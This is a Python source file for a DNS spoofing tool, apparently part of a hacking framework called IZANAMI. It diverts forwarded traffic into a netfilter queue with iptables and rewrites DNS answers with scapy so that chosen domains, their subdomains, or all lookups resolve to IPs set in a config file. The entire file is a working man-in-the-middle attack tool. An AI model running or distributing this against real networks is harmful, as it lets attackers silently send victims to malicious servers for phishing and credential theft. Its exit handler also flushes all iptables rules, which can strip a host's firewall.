#!/usr/bin/env python3
try:
    import os
    from scapy.all import IP, DNSQR, DNSRR, DNS, UDP
    from netfilterqueue import NetfilterQueue
    from core.colors import *
    from pwn import log
    from subprocess import call
    import configparser
    import tldextract
    import time
except ImportError as err:
    exit(err)

class ConfigErrorX(Exception):
    pass

def _makeDecision(qname):
    info = tldextract.extract(qname)
    if "*" in config:
        dconf = config["*"]
        ip = dconf.get('ip')
        return "*", ip
    elif info.registered_domain in config:
        dconf = config[info.registered_domain]
        rule = dconf.get('rule')
        ip = dconf.get('ip')
        if rule.lower() == "as":
            return rule, ip
        if (rule.lower() == "o") and (qname[:-1] in config):
            return rule, ip
    elif info.subdomain+'.'+info.registered_domain in config:
        dconf = config[info.subdomain+'.'+info.registered_domain]
        rule = dconf.get('rule')
        ip = dconf.get('ip')
        return rule, ip
    
    return "",""

def qtype_(packet):
    qr = packet.getlayer(DNSQR)
    qtype = qr.get_field('qtype').i2repr(qr, qr.qtype)
    return qtype

def process_packet(packet):
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(DNSRR):
        try:
            scapy_packet = modify_packet(scapy_packet)
        except IndexError:
            pass
        packet.set_payload(bytes(scapy_packet))
    packet.accept()

def t():
    return f"{YELLOW}{time.ctime()}{RESET}"

def _ctime(strc):
    return f'{strc}{time.strftime("%H:%M:%S", time.localtime())}{RESET}'

def _ignore(msg):
    print(f'{WHITE}[{_ctime(BLUE)}{WHITE}] {msg}')

def _success(msg):
    print(f'{WHITE}[{_ctime(GREEN)}{WHITE}] {msg}')

def modify_packet(packet):
    qname = packet[DNSQR].qname
    qname = qname.decode()
    qtype = qtype_(packet)
    rule, ip = _makeDecision(qname)
    if rule != "":
        _success(f"'{GREEN}{packet[IP].dst}{WHITE}' Querying {WHITE}'{GREEN}{qtype}{WHITE}' record ,{WHITE}'{GREEN}{qname}{WHITE}', {CYAN}redtirect{WHITE} to{CYAN}  →  {WHITE}'{GREEN}{ip}{WHITE}'.")
        packet[DNS].an = DNSRR(rrname=qname, rdata=ip)
    else:
        _ignore(f"'{BLUE}{packet[IP].dst}{WHITE}' Querying {WHITE}'{YELLOW}{qtype}{WHITE}' record , {WHITE}'{YELLOW}{qname}{WHITE}', ignoring...")
        packet[DNS].an = DNSRR(rrname=qname, rdata=packet[DNSRR].rdata)
    packet[DNS].ancount = 1
    del packet[IP].len
    del packet[IP].chksum
    del packet[UDP].len
    del packet[UDP].chksum
    return packet

def print_rule(string):
    print(f"\t{string}")

def xreturnMessage(count, domain, ip, rule):
    if domain == "*":
        message = f"Spoof All Traffic {WHITE}'{GREEN}{domain}{WHITE}'{RESET} to Address {WHITE}'{GREEN}{ip}{WHITE}'{RESET}"
    elif rule.lower() == "o":
        message = f"Spoof Only {WHITE}'{GREEN}{domain}{WHITE}'{RESET} to Address {WHITE}'{GREEN}{ip}{WHITE}'{RESET}"
    elif rule.lower() == "as":
        message = f"Spoof All {WHITE}'{GREEN}{domain}{WHITE}'{RESET} Subdomains to Address {WHITE}'{GREEN}{ip}{WHITE}'{RESET}"
    string = f'{WHITE}rule{YELLOW}:{CYAN}{count}{YELLOW}:{YELLOW} →  {RESET}{message}.'
    print_rule(string)

def print_help():
    print(f'\n\t{WHITE}DNS Spoofing Script {YELLOW}»»{WHITE} part of{BLINK}{BOLD} I Z A N A M I{RESET}{WHITE} Framework {YELLOW}»»{WHITE} by {BOLD}{CYAN}@{RED}YasserJanah{RESET} ({BOLD}{BLUE}fb/yasser.janah{RESET})\n')

def main():
    try:
        from sys import argv
        if argv[1] == "-h":
            print_help()
            exit(0)
    except IndexError:
        pass
    log.info(f"Started at {t()}")
    global config
    config = configparser.ConfigParser()
    p = log.progress(f"reading {YELLOW}'{WHITE}config/dns.conf{YELLOW}'{RESET} file")
    try:
        config.read("config/dns.conf")
        p.success(f'{WHITE}done.{RESET}')
        log.success('Rules : ')
        for n,i in enumerate(config):
            if i == "DEFAULT":
                n = 0
            else:
                try:
                    xreturnMessage(n, i, config[i].get('ip'), config[i].get('rule'))
                except Exception as errs:
                    print(errs)
    except Exception as err:
        p.failure(f'{RED}error.{RESET}')
        exit(log.critical(f"{RED}ConfigError {YELLOW}:{WHITE} {str(err)} {RESET}"))
    QUEUE_NUM = 0
    call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", str(QUEUE_NUM)])
    queue = NetfilterQueue()
    try:
        log.waitfor('waiting for packets...')
        queue.bind(QUEUE_NUM, process_packet)
        queue.run()
    except KeyboardInterrupt:
        call(["iptables", "--flush"])

if __name__ == "__main__":
    if os.getuid() != 0:
        exit(log.failure(f'{RED}script must run with root privileges !{RESET}'))
    try:
        main()
    except KeyboardInterrupt:
        call(["iptables", "--flush"])
        log.failure('Detected CTRL+C ! exiting...')
